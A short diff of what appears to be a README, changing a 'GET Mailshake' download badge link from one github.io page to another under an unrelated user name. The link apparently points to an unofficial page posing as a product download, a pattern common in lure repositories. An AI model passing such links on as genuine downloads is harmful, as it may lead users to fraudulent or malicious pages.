@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=ad6251f9618ef05820e9a5948643944fd973a510-4825588-images-thumbs&n=13)
 
-[![GET Mailshake](https://img.shields.io/badge/GET%20%E2%80%94%20Mailshake-0078D6?style=for-the-badge&logoColor=white)](https://sleep-mode-analysis-tools.github.io/.github/mailshake-pricing)
+[![GET Mailshake](https://img.shields.io/badge/GET%20%E2%80%94%20Mailshake-0078D6?style=for-the-badge&logoColor=white)](https://rivermullendydf.github.io/.github/mailshake-pricing)
 
 ---
 
